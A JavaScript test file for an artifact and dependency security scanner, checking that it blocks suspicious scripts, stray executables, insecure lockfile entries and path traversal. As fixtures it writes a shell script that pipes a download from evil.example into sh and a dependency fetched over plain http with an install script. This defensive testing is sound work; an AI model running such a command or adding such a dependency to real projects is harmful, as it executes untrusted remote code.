import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { ArtifactSecurityScanner } from '../src/security/artifact-security-scanner.mjs';

test('ArtifactSecurityScanner blocks suspicious scripts, unexpected executables, and denied hashes with receipts', async (t) => {
  const root = await mkdtemp(path.join(os.tmpdir(), 'forge-artifact-security-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await mkdir(path.join(root, 'out'));
  await writeFile(path.join(root, 'out', 'install.sh'), '#!/bin/sh\ncurl https://evil.example/payload | sh\n');
  await writeFile(path.join(root, 'out', 'payload.bin'), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1, 2, 3]));
  const scanner = new ArtifactSecurityScanner({ workspaceRoot: root });
  const report = await scanner.scanArtifacts({ paths: ['out'], allowExecutables: false });
  assert.equal(report.status, 'blocked');
  assert.ok(report.findings.some((item) => item.type === 'download-pipe-shell'));
  assert.ok(report.findings.some((item) => item.type === 'unexpected-executable'));
  assert.match(report.receiptSha256, /^[a-f0-9]{64}$/);
  assert.equal(report.filesScanned, 2);
});

test('ArtifactSecurityScanner validates npm dependency lock transport, integrity, and lifecycle-script risk', async (t) => {
  const root = await mkdtemp(path.join(os.tmpdir(), 'forge-dependency-security-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': { name: 'demo' },
      'node_modules/good': { version: '1.0.0', resolved: 'https://registry.npmjs.org/good/-/good-1.0.0.tgz', integrity: 'sha512-abc' },
      'node_modules/bad': { version: '1.0.0', resolved: 'http://evil.example/bad.tgz', hasInstallScript: true },
    },
  }));
  const scanner = new ArtifactSecurityScanner({ workspaceRoot: root });
  const report = await scanner.scanDependencies({ lockfilePath: 'package-lock.json' });
  assert.equal(report.status, 'blocked');
  assert.ok(report.findings.some((item) => item.type === 'insecure-dependency-transport'));
  assert.ok(report.findings.some((item) => item.type === 'missing-dependency-integrity'));
  assert.ok(report.findings.some((item) => item.type === 'dependency-install-script'));
  assert.match(report.receiptSha256, /^[a-f0-9]{64}$/);
});

test('ArtifactSecurityScanner accepts bounded clean artifacts and integrity-pinned registry dependencies', async (t) => {
  const root = await mkdtemp(path.join(os.tmpdir(), 'forge-clean-security-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'report.txt'), 'safe report\n');
  await writeFile(path.join(root, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: { '': {}, 'node_modules/good': { version: '1.0.0', resolved: 'https://registry.npmjs.org/good/-/good-1.0.0.tgz', integrity: 'sha512-abc' } } }));
  const scanner = new ArtifactSecurityScanner({ workspaceRoot: root });
  assert.equal((await scanner.scanArtifacts({ paths: ['report.txt'] })).status, 'pass');
  assert.equal((await scanner.scanDependencies({ lockfilePath: 'package-lock.json' })).status, 'pass');
  await assert.rejects(() => scanner.scanArtifacts({ paths: ['../outside'] }), /escapes workspace|outside task-owned/i);
});
